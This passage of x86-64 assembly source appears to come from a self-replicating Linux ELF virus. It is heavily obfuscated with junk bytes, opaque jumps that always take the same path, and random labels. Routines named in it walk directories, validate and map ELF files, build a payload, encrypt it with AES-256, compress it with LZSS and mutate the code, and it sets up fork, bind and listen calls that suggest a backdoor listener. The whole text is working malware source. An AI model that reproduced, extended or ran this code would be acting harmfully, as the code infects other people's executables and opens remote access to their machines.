    pop         rcx
    jmp         $+3
db 0x72
    jb          ..@BhEktAuOJvJK
    jae         ..@BhEktAuOJvJK
..@dHXRfqRGujOk:
    mov         rdi, rsi
    add         rdi, rcx
    mov         edx, DWORD [rdi]
    js          ..@HzrwbcTo9vEe
    jns         ..@HzrwbcTo9vEe
..@tfhwo4XLgf1e:
    add         r3, r5
    mov         r4, r3
    jmp         $+3
db 0xb5
    jmp         $+3
db 0xb6
    jmp         ..@DdVuff2lB0TM
..@hzqonFkwa0zd:
    push        rbx
    pop         rbx
    jl          ..@mSgZBkWqVcoU
    jge         ..@mSgZBkWqVcoU
..@iFMtXObLRMMl:
    push        rcx
    jmp         $+4
db 0xeb, 0x26
    jmp         $+3
db 0xa6
    jmp         $+5
db 0x40, 0x09, 0xed
    je          ..@yVK6SSarRP3G
    jne         ..@yVK6SSarRP3G
..@uLx3XsjYJaDf:
%ifdef X86_64
    push        rsi
%endif
    jmp         $+4
db 0x4a, 0x8e
    je          ..@W69tWz8tFynq
    jne         ..@W69tWz8tFynq
..@mHywAphL1bor:
    ret
    js          ..@oOAFpBBFbmEs
    jns         ..@oOAFpBBFbmEs
..@wGh8e4qVzVvd:
    mov         ebx, DWORD [rsi]
    jmp         $+4
db 0xf5, 0xa2
    jmp         $+5
db 0xec, 0x9a, 0x3c
    je          ..@fYdpVkrPyWYd
    jne         ..@fYdpVkrPyWYd
..@IDndLUESLWwx:
%ifdef X86_64
    or          dl, 1b
%endif
    jmp         ..@q0VQy8xGJise
..@cXnNBqRNpjym:
    leave
    jmp         $+3
db 0x2e
    jmp         ..@PRiTBFZFekcM
..@f1xslDInVtmk:
    mov         r1, rax
    mov         r2, vsp
    jmp         $+5
db 0x34, 0x1b, 0x1e
    jmp         $+3
db 0x4c
    jb          ..@AwuqBAQReorv
    jae         ..@AwuqBAQReorv
..@0NhaLgC76seF:
    ret
    jmp         $+4
db 0x2a, 0x4f
    jl          FileValidation
    jge         FileValidation
..@P6Gex4X6DAEG:
    rep         nop
    jmp         $+4
db 0x20, 0x2a
    jb          ..@JXuQttGh2Gml
    jae         ..@JXuQttGh2Gml
..@EME3uUWAUnV6:
    push        rcx
    jmp         ..@yJ3IbXvRVsqD
..@Jn8ZIqiqLRtd:
    jmp         ..@oOAFpBBFbmEs
    jmp         $+5
db 0xbd, 0x7e, 0x8b
    jl          ..@o8tuZNAcohWE
    jge         ..@o8tuZNAcohWE
..@2GFbxCkktPQ7:
%ifndef ENABLE_DEBUGGING
    push        WORD 0x5c11
%endif
    jmp         ..@dQ4jIoUheBhD
..@iWJqB03IObXn:
%ifndef ENABLE_DEBUGGING
    syscall
    test        eax, eax
%endif
    jmp         $+4
db 0x89, 0x10
    jmp         ..@2SdzIFKamJF3
..@lio6DFIxEcHx:
    pop         rdi
    je          ..@YwkeTuzgBeCP
    jne         ..@YwkeTuzgBeCP
..@bFMMf2zUWMo1:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         ..@3NzYAXYjms3Q
..@69du6fkiWgl0:
    ja          ..@CihbPVsTeTLj
    jmp         $+5
db 0xd1, 0x68, 0xbe
    jl          ..@1k0D7lbWNT0q
    jge         ..@1k0D7lbWNT0q
..@Woe2ZseCdVr6:
    mov         dl, BYTE [rsp+bytes+2]
    xor         dl, BYTE [rsp]
    jb          ..@5n6RZyp0Y76N
    jae         ..@5n6RZyp0Y76N
LzssEncoder:
    jmp         ..@OrcBYayvzeN9
..@fHAyxnnkKq9Z:
    push        rdi
    pop         rdi
    mov         BYTE [rdi], 68h
    jmp         $+4
db 0xd1, 0x5b
    jmp         ..@saJH5OOifWgc
..@GLjIMezr7lam:
    call        WORDToDWORDASCII
    jmp         $+3
db 0xba
    jl          ..@keQ6dWfZR5YI
    jge         ..@keQ6dWfZR5YI
..@kHdEfm0emLQq:
    ret
    jmp         $+3
db 0xc2
    jmp         $+3
db 0x64
    je          IsNum
    jne         IsNum
..@0fU7YmJtjli0:
    cmp         rax, 0x00
    jl          ..@IvCgQuVXU7N6
    jmp         ..@frpP2AQU7tY2
..@e4GjuuwU50Xn:
    mov         r5, r1
    mov         rbp, rbp
    jmp         $+5
db 0xab, 0x0e, 0x79
    jl          ..@q4ZjX6j4cbbt
    jge         ..@q4ZjX6j4cbbt
..@PSMpVMfdMf4J:
    push        rcx
    jmp         $+5
db 0x81, 0xc0, 0x72
    jmp         ..@iyzXiNh3NxN7
..@l7tjE7i7aPnb:
%ifdef X86_64
    pop         rax
%endif
    jmp         $+5
db 0x42, 0x34, 0xc7
    js          ..@dgDHPgaxDfbu
    jns         ..@dgDHPgaxDfbu
..@XVHi6Cw8QoBG:
    mov         ecx, WINDOW_LENGTH
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jmp         $+5
db 0x5f, 0x40, 0xd6
    jmp         $+5
db 0xe5, 0xc3, 0xe3
    je          ..@nj7IkjrvJKSG
    jne         ..@nj7IkjrvJKSG
..@w5nHBODhFtnt:
    and         cl, 111b
    jmp         $+5
db 0x70, 0x33, 0xe5
    jmp         $+3
db 0x7a
    jmp         $+4
db 0x89, 0xf9
    js          ..@9Bd94AJe7Ozq
    jns         ..@9Bd94AJe7Ozq
..@oJgCuyGtwPFr:
    add         rdi, rcx
    jl          ..@rgKmqdLpDs3V
    jge         ..@rgKmqdLpDs3V
..@NWNi65wapRK3:
    add         r5, 1
    js          ..@pCrOxAxkTW17
    jns         ..@pCrOxAxkTW17
..@h9uaJjwTkNgC:
%ifdef X86_32
    je          ..@TlOOr11ZBt9S
%endif
    js          ..@LJTG7SweJbk4
    jns         ..@LJTG7SweJbk4
..@0jSFrQrqpAtP:
    div         rbx
    jmp         $+4
db 0xd0, 0xd0
    jmp         $+3
db 0xc6
    jb          ..@JyCMJU3h1WLV
    jae         ..@JyCMJU3h1WLV
..@QesUTikrPhpJ:
    cmp         rcx, 5
    mov         rdi, rdi
    jmp         $+4
db 0xff, 0x69
    jmp         $+3
db 0x32
    jmp         $+4
db 0x56, 0xbf
    jmp         ..@69du6fkiWgl0
..@iyzXiNh3NxN7:
    xor         rax, rax
    jmp         ..@cUjpdpJ0Hgom
..@jOLcIw56oRRN:
%ifndef ENABLE_DEBUGGING
    xor         r4, r4
%endif
    js          ..@Sa7B2Ycw9Nf3
    jns         ..@Sa7B2Ycw9Nf3
..@HGikMboLI6OP:
%ifdef X86_64
    push        rdx
%endif
    jmp         $+4
db 0x2c, 0x30
    js          ..@Pox1uqPB47tR
    jns         ..@Pox1uqPB47tR
..@04j9wQWZBGFF:
    je          ..@NX0qQAFhp98l
    jmp         $+4
db 0x74, 0xf0
    je          ..@6uirjlY8BdW4
    jne         ..@6uirjlY8BdW4
..@iWSFsWG9BsjN:
    lea         r1, QWORD [rsp+_INFFILE_OFF.file]
    mov         rcx, rcx
    call        FileValidation
    jmp         $+3
db 0x0d
    jl          ..@RQ5NuF3ajToc
    jge         ..@RQ5NuF3ajToc
..@yVK6SSarRP3G:
    xor         rax, rax
    jl          ..@lXhf6NVmcpf8
    jge         ..@lXhf6NVmcpf8
NonBinaryFile:
    jmp         ..@GHi6BJGoKkHm
..@le0N6L6EPWrA:
    mov         rax, rax
    jmp         ..@gTtb4sbRP5BQ
..@P3NCZ0WrmP1x:
%ifdef X86_64
    mov         rsi, rsi
%endif
    js          ..@v7wrTsBgK4Os
    jns         ..@v7wrTsBgK4Os
..@88es0hZbduSg:
    mov         rsi, rsi
    je          ..@uaPRMwSpKrFC
    jne         ..@uaPRMwSpKrFC
..@FR16nF9CgAqR:
    pop         rcx
    jl          ..@AaXdwZqu4OcY
    jge         ..@AaXdwZqu4OcY
..@zQIvVpcmwetV:
    xor         rax, rax
    jmp         ..@IyOPQ5IYLiNb
..@XSY8pQzyjZmC:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
    mov         eax, SYS_LISTEN
%endif
    js          ..@pm2ZQT8usUTP
    jns         ..@pm2ZQT8usUTP
..@fseyZvl5p9MH:
    xor         r2, r2
    mov         r1, m6
    mov         r2, non_encrypted_len
    jmp         ..@yXNe6nvnTwZT
..@vKAN36OYPn6K:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
%endif
    js          ..@91zgwbClouee
    jns         ..@91zgwbClouee
..@1Ds5s1YrU2eZ:
    xor         rcx, rcx
    jl          ..@XVHi6Cw8QoBG
    jge         ..@XVHi6Cw8QoBG
..@JhwSxCf14Nro:
    pop         rax
    jmp         $+4
db 0x5b, 0xc5
    jmp         $+4
db 0x8a, 0x1c
    jmp         ..@9PwI0SKp0zP1
..@CWBveDuN9rZT:
    mov         rbx, rbx
    jmp         $+4
db 0xa9, 0x26
    jmp         $+4
db 0x2f, 0x42
    jmp         $+3
db 0x43
    jb          ..@nOhfdBkO0jbB
    jae         ..@nOhfdBkO0jbB
..@D3I7OPUup20e:
%ifndef ENABLE_DEBUGGING
    syscall
    xor         rax, rax
%endif
    je          ..@Szd9WNMJ7OtY
    jne         ..@Szd9WNMJ7OtY
MapFile:
    jmp         ..@7kWhAgQd9Zsf
..@cHa50gU7bTcm:
    xor         rax, rax
    mov         rsi, QWORD [rsp+bytes]
    mov         rcx, QWORD [rsp]
    je          ..@3XRuMvt8VxQW
    jne         ..@3XRuMvt8VxQW
..@SCpB55urRvRC:
    cmp         r4, QWORD [rsp+_PROC_OFF.dirnread]
    mov         rcx, rcx
    jmp         $+4
db 0xaa, 0xee
    js          ..@s9AJatE4NOQD
    jns         ..@s9AJatE4NOQD
..@nHeTQkmoBqcd:
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    test        al, al
    push        rdi
    js          ..@c0fKarYDzBsY
    jns         ..@c0fKarYDzBsY
..@IXbH35P888Oh:
    mov         DWORD [rsp+_MUTA_OFF.index], ecx
    jmp         $+4
db 0x39, 0x80
    jmp         $+3
db 0x57
    jb          ..@pCygiE6Fim1Q
    jae         ..@pCygiE6Fim1Q
..@zZb5GYqyaq4X:
    jmp         ..@l46rPEDKBWow
    jmp         ..@tcyebFYfahNp
..@Sd65Es3DJcFZ:
    push        rsi
    jmp         ..@LjLY55shq71A
..@XJ85uW7FZbSy:
    mov         edx, 100000000b
    or          bx, dx
    jmp         ..@FiF583wZ9llx
    jmp         $+5
db 0xe0, 0x65, 0x9c
    jb          ..@5WpIo8mMLQLd
    jae         ..@5WpIo8mMLQLd
..@ZP5JiLNf3G82:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jmp         $+5
db 0x50, 0x83, 0xf0
    jl          ..@aQhQzAQbggWo
    jge         ..@aQhQzAQbggWo
..@dgDHPgaxDfbu:
    xor         rcx, rcx
    mov         rsi, QWORD [rsp+bytes]
    mov         rcx, QWORD [rsp]
    jmp         $+3
db 0xe5
    je          ..@aq98Fwkrav8x
    jne         ..@aq98Fwkrav8x
..@uZ2UKGMsS40q:
    ret
    jmp         $+4
db 0x5d, 0x5f
    jmp         $+5
db 0x87, 0x5e, 0x14
    jb          ConvertMoveValueToPushPopValue
    jae         ConvertMoveValueToPushPopValue
..@JfiMsq3h9kW8:
    lea         r2, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    jb          ..@1n4M7nIL0b3X
    jae         ..@1n4M7nIL0b3X
..@6lykbhN2D8xD:
    mov         edx, ebx
    jmp         ..@8kQVC4svHz7I
..@tOXjZ13y7MFQ:
    push        rsi
    js          ..@NLGIwbJ4YuqL
    jns         ..@NLGIwbJ4YuqL
..@60VAZNZZ7BIJ:
    xor         rbx, rbx
    js          ..@J1r764fC38Kc
    jns         ..@J1r764fC38Kc
..@93xXZgEB0p6Y:
    ret
    jmp         $+5
db 0xe8, 0xd6, 0xee
    jmp         $+3
db 0xa6
    jmp         UpdateSignature
..@fpNMOAkxFWpk:
    pop         rbx
    je          ..@Q8lh0u1o9QXk
    jne         ..@Q8lh0u1o9QXk
..@nkeTxUtIynWv:
    mov         ax, WORD [r5+linux_dirent.d_reclen]
    jl          ..@QtZmN8mXnCK6
    jge         ..@QtZmN8mXnCK6
..@l5LU2hTal81V:
    mov         rbx, 909090c0h
    jl          ..@gyRzdRImdnZF
    jge         ..@gyRzdRImdnZF
..@XGVjPPVdBEqe:
    jge         ..@76UtvF8CkhTo
    jmp         $+5
db 0x1e, 0x9e, 0xba
    jmp         $+4
db 0xf1, 0xdf
    jmp         ..@3BDsqhoXdvwl
..@mADHDEp9ERG3:
    mov         r2d, DWORD [r1]
    js          ..@bEEckaOUZAGM
    jns         ..@bEEckaOUZAGM
..@rxlIWByuTwKM:
    jne         ..@xJdXYfYj1DWz
    js          ..@0SPDNW7xaF41
    jns         ..@0SPDNW7xaF41
..@6OaHRQvqzscL:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_FORK
%endif
    je          ..@iWJqB03IObXn
    jne         ..@iWJqB03IObXn
..@iuKGrFsr18hv:
%ifdef X86_64
    mov         rax, rsi
    and         rax, 100b
    mov         rax, rax
%endif
    jl          ..@Qf45onhWLgOo
    jge         ..@Qf45onhWLgOo
..@s4AiiQTM9ilK:
    pop         rsi
    jl          ..@LVwGzfOdMUZ2
    jmp         $+3
db 0xb7
    jmp         ..@R7aoSSgZ8j9R
..@7mqchtPkP2Ky:
    add         rdi, 1
    js          ..@9J9gtYrw63MD
    jns         ..@9J9gtYrw63MD
..@DBJbfG889Dnl:
    mov         rbp, rbp
    jmp         $+5
db 0x14, 0xf6, 0x42
    jb          ..@2N2mmGuk3rjq
    jae         ..@2N2mmGuk3rjq
..@iP5Z8haxjRVB:
    push        rax
    jl          ..@CVjVoYHWEsDA
    jge         ..@CVjVoYHWEsDA
..@KcQMrchrXElm:
    mov         rax, SYS_GETCWD
    jmp         $+5
db 0x0e, 0x63, 0x1c
    js          ..@XPZ5D6RrjRuV
    jns         ..@XPZ5D6RrjRuV
..@ivT9Y9vN6KJc:
    add         r2, rax
    jmp         $+4
db 0x89, 0xfe
    jl          ..@D3weXy8psjLQ
    jge         ..@D3weXy8psjLQ
..@LTQrngYWh2Rz:
    ret
    jmp         $+3
db 0xae
    jmp         $+4
db 0xad, 0x13
    jmp         UnmapFile
..@846cx2tjsm7x:
    pop         r5
    jmp         $+5
db 0x5b, 0x75, 0x31
    je          ..@R2R1gcpaKQ1Q
    jne         ..@R2R1gcpaKQ1Q
..@PvHxEUD3DIgG:
    xor         r2, r2
    js          ..@wBYnpaMFjl36
    jns         ..@wBYnpaMFjl36
..@X1xgrXKRVzm6:
    jz          ..@C1rvp62M5x3u
    jmp         $+5
db 0x22, 0x6b, 0xcc
    jmp         $+5
db 0xdf, 0xee, 0xe9
    jl          ..@oIJmTAKf5jq5
    jge         ..@oIJmTAKf5jq5
..@owEkiorSwDwb:
    mov         r2, m5
    call        CreatePayload
    pop         r3
    jmp         $+5
db 0x0e, 0xdc, 0x51
    jmp         $+3
db 0xc8
    jmp         $+5
db 0xd5, 0x0d, 0x9b
    js          ..@YW3y4vo3EoqX
    jns         ..@YW3y4vo3EoqX
..@YCCaz6vDYcQ2:
    pop         rdx
    jmp         $+4
db 0x8a, 0x00
    je          ..@L3WDRU6rCHKW
    jne         ..@L3WDRU6rCHKW
..@5WGndJYv5CI5:
    xor         rax, rax
    mov         r3, [r1+e_h.e_phoff]
    jmp         ..@NZw4GFAuMcMW
..@oLsQH0D92105:
    ret
    jmp         $+5
db 0xe3, 0x41, 0xfe
    jmp         ..@FHu5TkFyCC6y
..@ImoOSieRujWA:
    mov         r3, rax
    jmp         $+4
db 0x51, 0x6c
    jmp         $+4
db 0xe0, 0xe3
    js          ..@0nipeZ7hntDl
    jns         ..@0nipeZ7hntDl
..@yW123RJPGvbm:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], r1
    mov         QWORD [rsp+_LZSSE_OFF.outputaddr], r3
    jmp         ..@xLPSjBQffRhi
..@XY2wapTSRFpv:
    test        al, al
    jnz         ..@w5NpUI0VlVwW
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+3
db 0x3c
    jmp         $+4
db 0x99, 0x26
    jmp         $+4
db 0xc8, 0xb4
    jb          ..@KQXJUmH68PGv
    jae         ..@KQXJUmH68PGv
..@gyRzdRImdnZF:
%ifdef X86_64
    push        rbx
    pop         rbx
    cmp         dl, 41h
%endif
    js          ..@6lXoBiSwolOo
    jns         ..@6lXoBiSwolOo
..@1TUp7CwvKQcQ:
    cmp         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH*2-LOOKAHEAD_LENGTH
    je          ..@9Loo9pcmDbvD
    jne         ..@9Loo9pcmDbvD
..@8k5z0Eku2FYw:
    push        r1
    sub         rsp, _VADDR_OFF_size
    jmp         $+3
db 0xab
    jmp         $+5
db 0xbd, 0x0a, 0x9e
    js          ..@NhXyy236k85k
    jns         ..@NhXyy236k85k
..@AwuqBAQReorv:
    mov         r3, non_packed_len
    jmp         $+5
db 0xf9, 0x27, 0x93
    jmp         $+5
db 0xd3, 0x95, 0xfd
    js          ..@5r6qrXHUZEMI
    jns         ..@5r6qrXHUZEMI
..@RmtXpyRcQuvp:
    jne         ..@CjOFnyczNUbZ
    js          ..@ysmjUBJAOQx4
    jns         ..@ysmjUBJAOQx4
..@DJeYEfUiyl5z:
    push        rdi
    jmp         $+5
db 0x23, 0xfe, 0x39
    je          ..@lio6DFIxEcHx
    jne         ..@lio6DFIxEcHx
..@lo97Tduom52c:
    add         r4, 1
    jmp         ..@3LPX5WJ3Bn8h
    jmp         $+4
db 0xd6, 0xbb
    jl          ..@lOQEU3M5o9WQ
    jge         ..@lOQEU3M5o9WQ
..@xT39H6EiAR0V:
    mov         r3d, 0x20
    jmp         $+5
db 0x5a, 0xa7, 0xdb
    jmp         $+5
db 0x51, 0x32, 0xe5
    jl          ..@CkoX6D7uIB5D
    jge         ..@CkoX6D7uIB5D
..@bRKiNCSKtyK4:
    jmp         ..@Jt5gBrMDXdR9
    jmp         ..@Jt5gBrMDXdR9
..@8GPpIqoCiavu:
    mov         r5, r1
    jmp         $+5
db 0xb5, 0x7a, 0x4e
    jmp         ..@zQIvVpcmwetV
..@l1Oumfj6OxTn:
%ifdef X86_64
    mov         edx, DWORD [rdi]
%endif
    js          ..@0ColaOZtRaxd
    jns         ..@0ColaOZtRaxd
..@7hDNqIZAb58j:
    add         rsp, _KEYGEN_OFF_size
    js          ..@Y1Tnv550kINb
    jns         ..@Y1Tnv550kINb
..@xFlsiW36zZur:
    mov         ax, WORD [rsp+_DYNPIE_OFF.shentsize]
    mul         rbx
    mov         rdi, QWORD [rsp+_DYNPIE_OFF.sh_ptr]
    jmp         $+4
db 0x24, 0x72
    jmp         $+4
db 0x4b, 0x70
    jb          ..@YrOYgxvDdIpW
    jae         ..@YrOYgxvDdIpW
..@IF8jho9rOEpW:
    add         r1, signature_len
    jmp         $+5
db 0x13, 0x99, 0x6a
    jl          ..@vtOpSipkaLDH
    jge         ..@vtOpSipkaLDH
..@z4oiDa2pQYjj:
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         $+5
db 0x47, 0x3f, 0x6e
    jmp         $+3
db 0xd5
    jmp         ..@cKbxaJ3EaKS9
..@QizyuPKJqx4r:
    xchg        rcx, rcx
    js          ..@etw4WNzzENnP
    jns         ..@etw4WNzzENnP
..@sBZAR8ZRPCfJ:
%ifdef X86_64
    mov         r8, 0xffffffffffffffff
%endif
    jmp         $+5
db 0xdc, 0x0d, 0x9b
    je          ..@ua9hBN6DwwgB
    jne         ..@ua9hBN6DwwgB
..@7inhcZIKukmI:
    mov         rsi, rsi
    mov         QWORD [rsp+_PROC_OFF.dirname], r5
    jmp         $+5
db 0x1f, 0xcd, 0xde
    jb          ..@oKqdtJY7akcN
    jae         ..@oKqdtJY7akcN
..@GvF2PXahBG33:
    VAR         packed, status
    jmp         ..@74iGnCPo0RA5
..@PuO28pFapOXJ:
%ifdef X86_64
    test        al, al
%endif
    jmp         ..@5n2ABk4YcTal
..@i6Q7rfY5rNKQ:
    syscall
    jmp         ..@FgL8eSQZowbE
..@zFcGmZ2EW8vF:
    mov         rdi, QWORD [rsp+_AESE_OFF.keyaddr]
    jmp         $+3
db 0xae
    jb          ..@Vpyhr0OR1Nhr
    jae         ..@Vpyhr0OR1Nhr
..@OWZQyHUDcRAj:
    push        rax
    jmp         ..@VVAFW0q8GIyk
..@p1DrkBOMS8t6:
    and         bx, 00f8h
    cmp         bl, 58h
    jne         ..@2K19Yi4ljM8F
    jmp         $+3
db 0x47
    jmp         ..@ygK59Gy0sX7l
..@8oeRVZYG20Za:
    push        r5
    jmp         ..@JGhcOYqbX2Zn
..@px4z6mYtK98G:
%ifdef X86_64
    cmp         edx, 90585041h
%endif
    jl          ..@zyRdD7CpjpuV
    jge         ..@zyRdD7CpjpuV
..@s0uOMgNXVLnO:
    and         r2, 1b
    jmp         ..@4XOHduOhHMDP
..@Pp2UNMLw585i:
    mov         rcx, QWORD [rsp]
    jmp         $+4
db 0x84, 0x75
    jmp         $+3
db 0x02
    js          ..@H638HcuwPAAg
    jns         ..@H638HcuwPAAg
..@lAibBc5b5VUP:
    xor         rbx, rbx
    jl          ..@8VFwjCi1WtoD
    jge         ..@8VFwjCi1WtoD
..@qRjpeFo45cd1:
    mov         rsp, rsp
    add         rbx, 1
    js          ..@Wgs0ql0gCjUr
    jns         ..@Wgs0ql0gCjUr
..@JoTO25Tmsnro:
    push        rcx
    js          ..@MWcRu6EfA1Mv
    jns         ..@MWcRu6EfA1Mv
..@7e2aXlpBXe51:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    movzx       rax, BYTE [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_reclen+r4]
    jmp         $+5
db 0x7a, 0x1f, 0xf2
    jmp         ..@dkHRDkLINNsu
..@JVO8S3iPJ9P9:
    mov         rdx, rdx
    GGLOBAL     _signature.start
    xchg        rsi, rsi
    jmp         $+3
db 0x0f
    jmp         ..@w0GNJaEUgaXI
..@ANMnNzngtkyC:
    shl         edx, POSITION_BITS+LENGTH_BITS
    jmp         $+4
db 0x38, 0x2a
    js          ..@tTaPaAFvqSqr
    jns         ..@tTaPaAFvqSqr
..@jm2m1dcCa0wU:
    mov         rsp, rsp
    jb          ..@jPX2fNx0ZtUb
    jae         ..@jPX2fNx0ZtUb
..@XndGscxJaKlF:
%ifdef X86_64
    test        cl, cl
%endif
    jl          ..@egOpJVzoGa48
    jge         ..@egOpJVzoGa48
..@GfzHvAleB7Zy:
%ifdef X86_64
    cmp         edx, 0000b841h
%endif
    jmp         $+3
db 0xa4
    jmp         $+3
db 0x38
    jmp         $+3
db 0xe4
    jmp         ..@mI28DWwDgiwE
..@gw9R7uk1aryj:
    cmp         ecx, DWORD [rsp+_MUTA_OFF.size]
    mov         rbp, rbp
    jmp         $+3
db 0x3b
    js          ..@XGVjPPVdBEqe
    jns         ..@XGVjPPVdBEqe
..@igahxjapXHEX:
    pop         rdi
    jb          ..@iP5Z8haxjRVB
    jae         ..@iP5Z8haxjRVB
..@9hmYbkxp4VZM:
    mov         rsp, rsp
    mov         ecx, DWORD [rsp+_MUTA_OFF.index]
    jl          ..@63Jx53RFkBlL
    jge         ..@63Jx53RFkBlL
..@9EP7JQlnuYD2:
    lea         r1, [rsp+_PAYLOAD_OFF.key]
    mov         r2, m6
    jmp         $+3
db 0x09
    jb          ..@uVJCfosuEu8s
    jae         ..@uVJCfosuEu8s
..@LYEyDRUtgZHF:
    cmp         BYTE [r1], 0x0
    jmp         ..@ePsHuV22Ud2S
..@cedswQUZa2Gr:
    pop         rax
    pop         rsi
    jmp         $+5
db 0xe1, 0x41, 0x02
    jmp         $+5
db 0x77, 0x5e, 0x02
    jmp         ..@gfPM53L5bEUI
..@BxYkwVEfujhX:
    sub         ebx, 1
    cmp         bx, WORD [rsp+_LZSSE_OFF.w_index]
    jl          ..@PvskUD6dBeN7
    jge         ..@PvskUD6dBeN7
..@tWOsBJOQc6gz:
    xchg        rbx, rbx
    jmp         $+4
db 0x9b, 0x68
    jl          ..@kfopQMa810Fc
    jge         ..@kfopQMa810Fc
..@kBb1XoQOXW18:
    jnz         ..@jAAW6sOMU7Ms
    mov         rax, 1
    jmp         $+4
db 0x12, 0x32
    js          ..@f3ZmzOHbYIh3
    jns         ..@f3ZmzOHbYIh3
..@casEFp6uBhSw:
    add         r2, signature_len
    xchg        rsp, rsp
    movv        r3, keycreation_len
    jmp         $+4
db 0x22, 0x24
    jmp         $+5
db 0xa6, 0x04, 0xeb
    jb          ..@PoLUjUoxS4uG
    jae         ..@PoLUjUoxS4uG
..@wnddSFQ5nGH2:
    call_vsp    Aes256KeyCreation
    jmp         $+3
db 0xa3
    js          ..@3LuF2MBRBUts
    jns         ..@3LuF2MBRBUts
..@iEy609KorP4Z:
    sub         WORD [rsp+_LZSSE_OFF.w_index], WINDOW_LENGTH
    mov         ecx, WINDOW_LENGTH*2
    jb          ..@8vURFwhcJ3MN
    jae         ..@8vURFwhcJ3MN
..@uSkRakML4wyN:
    pop         r1
    mov         r2, QWORD [r1+file.filesize]
    js          ..@nsFmeBspwjR7
    jns         ..@nsFmeBspwjR7
..@iY0uTPJEstJw:
    or          dl, 50h
    mov         bl, dl
    jmp         ..@iuKGrFsr18hv
..@L2IKjf9eE98W:
    push        rsi
    jmp         $+4
db 0xde, 0xd4
    jl          ..@PSMpVMfdMf4J
    jge         ..@PSMpVMfdMf4J
..@HWkqb8yVyYo0:
    syscall
    jmp         ..@x2Nlmz2ItQxB
..@xJdXYfYj1DWz:
    add         rcx, 2*bytes
    jmp         $+5
db 0xa7, 0xdb, 0x8c
    jmp         ..@dzxwQAZNTAv2
..@VZKlBXNzwUfd:
%ifdef X86_32
    mov         dx, WORD [rdi]
%endif
    jmp         $+5
db 0xb2, 0xf8, 0x6d
    jl          ..@r3sKWspRz9Ne
    jge         ..@r3sKWspRz9Ne
..@QO8ojDNmXM62:
    call        MapFile
    js          ..@GfcaDk3P5N5z
    jns         ..@GfcaDk3P5N5z
..@XC2Ul1dt2aOc:
    push        r4
    push        r5
    sub         rsp, _UPDATASIG_OFF_size
    jl          ..@GdlEQqmXwYDM
    jge         ..@GdlEQqmXwYDM
..@xCVG4qGhmYVF:
%ifdef X86_64
    xchg        rcx, rcx
%endif
    jb          ..@hjtB3nd0x7E1
    jae         ..@hjtB3nd0x7E1
..@X9r1F1j54Zc2:
    sub         rsp, _MUTA_OFF_size
    jmp         $+5
db 0x64, 0x70, 0x3c
    jmp         $+5
db 0x8f, 0x16, 0x33
    jb          ..@uEcbI8Yu0cVn
    jae         ..@uEcbI8Yu0cVn
..@QzTcjvRgBKi2:
    mov         rax, 1
    jb          ..@qjOCvA9DKJYp
    jae         ..@qjOCvA9DKJYp
..@cC08XnUZIqow:
    call        IsELFComplete
    mov         rbp, rbp
    test        al, al
    jmp         $+3
db 0x37
    jmp         $+4
db 0xf3, 0x34
    js          ..@kBb1XoQOXW18
    jns         ..@kBb1XoQOXW18
..@ysmjUBJAOQx4:
    xor         rcx, rcx
    jmp         $+5
db 0x12, 0xab, 0xac
    jmp         $+3
db 0xb6
    jb          ..@LymlshYoZIW1
    jae         ..@LymlshYoZIW1
..@EWqZMStOmsVL:
    pop         rsi
    mov         rax, (-1)
    jmp         ..@aa4JwCWVCI4i
..@BFwouY8qsHBv:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jmp         $+5
db 0x01, 0x46, 0x24
    jmp         $+3
db 0x6b
    jmp         ..@LaRkNY3UX2AR
..@oKqdtJY7akcN:
    mov         r1, r5
    push        rcx
    pop         rcx
    jmp         $+5
db 0x61, 0x1f, 0x38
    jl          ..@6EuOFe9LMx0y
    jge         ..@6EuOFe9LMx0y
ConvertPushPopToMove:
    jmp         ..@IJlmoEvYmJ17
..@zIR1spb7QLLr:
    mov         WORD [rsp+_UPDATASIG_OFF.index], r2w
    mov         DWORD [rsp+_UPDATASIG_OFF.keyprev], r3d
    jmp         $+3
db 0xf1
    jmp         ..@B6O5ebRPbhaE
..@83EuOCBXtNFk:
%ifdef X86_64
    cmp         edx, 00c08348h
    je          ..@TlOOr11ZBt9S
    cmp         edx, 00c08148h
%endif
    jmp         $+4
db 0xd4, 0xe5
    js          ..@V77p2Q7r4Y9m
    jns         ..@V77p2Q7r4Y9m
..@pUBBlbENMw2N:
%ifndef ENABLE_DEBUGGING
    jmp         ..@eLAQFp4O4zCz
%endif
    jmp         $+5
db 0xf8, 0xe1, 0xe8
    js          ..@khwy1wAVKufM
    jns         ..@khwy1wAVKufM
..@HyxhWxWYqVXw:
    ret
    js          ..@ouorjOD8AGZy
    jns         ..@ouorjOD8AGZy
..@5luxX1sx4Hwk:
    push        r1
    push        r2
    jmp         $+3
db 0xfe
    jmp         $+4
db 0xe4, 0xae
    jmp         ..@tmIBCHcYMMWV
..@CjbE3RhOA3sg:
    add         rsp, _PROC_OFF_size
    jb          ..@RaxnOSwgOnfr
    jae         ..@RaxnOSwgOnfr
..@UOf7ZHcYH6SJ:
%ifdef X86_64
    mov         rcx, rcx
%endif
    jmp         $+3
db 0xd4
    js          ..@J4Sjbxs73beZ
    jns         ..@J4Sjbxs73beZ
..@iMxtzQa24SYU:
    jne         ..@jAAW6sOMU7Ms
    jmp         $+3
db 0x72
    jmp         $+3
db 0xcf
    jb          ..@IS2JMGpwDmLR
    jae         ..@IS2JMGpwDmLR
..@HIojJATnW4ZR:
    xchg        rcx, rcx
    jmp         $+3
db 0x29
    jmp         $+4
db 0x8b, 0x43
    jb          ..@ePbEeT83Mabu
    jae         ..@ePbEeT83Mabu
..@TFL9s8AHVfDZ:
    jmp         ..@uXkQCGQfVkmO
    jmp         $+5
db 0xba, 0xd9, 0x44
    jl          ..@1EF2J7pYSpND
    jge         ..@1EF2J7pYSpND
..@GfcaDk3P5N5z:
    cmp         rax, 0
    jmp         $+3
